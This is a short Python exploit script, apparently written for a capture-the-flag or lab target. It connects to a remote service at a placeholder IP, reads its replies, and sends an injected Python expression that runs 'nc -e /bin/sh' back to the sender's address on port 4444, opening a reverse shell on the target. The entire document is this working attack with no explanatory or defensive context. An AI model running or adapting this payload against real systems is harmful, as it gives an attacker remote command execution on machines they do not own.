import socket

host = '<remote-ip>' # insert the IP here
port = 10000

s = socket.socket()
s.connect((host,port))

while 1:
	data = s.recv(2048).decode('utf-8')
	print( data)
	data = s.recv(2048).decode('utf-8')
	print(data)
	s.send(b'__import__("os").system("nc -e /bin/sh <local-ip> 4444")\n') # insert your local ip
s.close()
